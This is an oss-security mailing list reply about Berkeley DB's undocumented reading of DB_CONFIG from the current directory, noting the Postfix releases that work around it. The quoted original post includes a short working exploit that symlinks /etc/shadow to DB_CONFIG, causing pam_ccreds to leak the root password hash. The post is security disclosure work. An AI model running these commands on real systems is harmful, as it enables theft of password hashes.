X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1699" "Wednesday" "14" "June" "2017" "22:38:26" "+0200" "Solar Designer" "solar@openwall.com" "<20170614203826.GA22586@openwall.com>" "44" "Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd" "^Date:" nil nil "6" "2017061420:38:26" "[oss-security] Berkeley DB reads DB_CONFIG from cwd" (number mark "        solar@openwa Jun 14   44/1699  " thread-indent "\"Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd\"\n") "<20170610220613.mfmmpjey2l4aptcj@jwilk.net>" ("<20170610220613.mfmmpjey2l4aptcj@jwilk.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 31910 invoked by uid 550); 14 Jun 2017 20:39:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30210 invoked from network); 14 Jun 2017 20:38:30 -0000
Message-ID: <20170614203826.GA22586@openwall.com>
References: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
User-Agent: Mutt/1.4.2.3i
Date: Wed, 14 Jun 2017 22:38:26 +0200
From: Solar Designer <solar@openwall.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd
To: oss-security@lists.openwall.com

On Sun, Jun 11, 2017 at 12:06:13AM +0200, Jakub Wilk wrote:
> Apparently Berkeley DB reads the DB_CONFIG configuration file from the 
> current working directory by default[*]. This is surprising and AFAICT 
> undocumented.
> 
> Here's how to exploit it against pam_ccreds:
> 
>    $ cat /etc/shadow
>    cat: /etc/shadow: Permission denied
>    $ ln -sf /etc/shadow DB_CONFIG
>    $ /sbin/ccreds_chkpwd moo < /dev/null
>    BDB1584 line 1: 
>    root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect 
>    name-value pair
> 
> (The above was tested on Debian jessie.)
> 
> In the past, nss_db was also exploitable:
> CVE-2010-0826
> 
> 
> [*] More precisely, this seem to happen when you call db_create() with 
> dbenv=NULL; or if you use the dbm_open() function.

Postfix "3.2.2 and legacy releases 3.1.6, 3.0.10 and 2.11.10" were
released working around this issue:

http://www.postfix.org/announcements/postfix-3.2.2.html
 
  * Security: Berkeley DB versions 2 and later try to read settings
    from a file DB_CONFIG in the current directory. This undocumented
    feature may introduce undisclosed vulnerabilities resulting in
    privilege escalation with Postfix set-gid programs (postdrop,
    postqueue) before they chdir to the Postfix queue directory,
    and with the postmap and postalias commands depending on whether
    the user's current directory is writable by other users. This
    fix does not change Postfix behavior for Berkeley DB versions
    < 3, but it does reduce postmap and postalias 'create' performance
    with Berkeley DB versions 3.0 .. 4.6.

The corresponding change log entry is from June 11 - looks like same day
as Jakub's posting.

Alexander
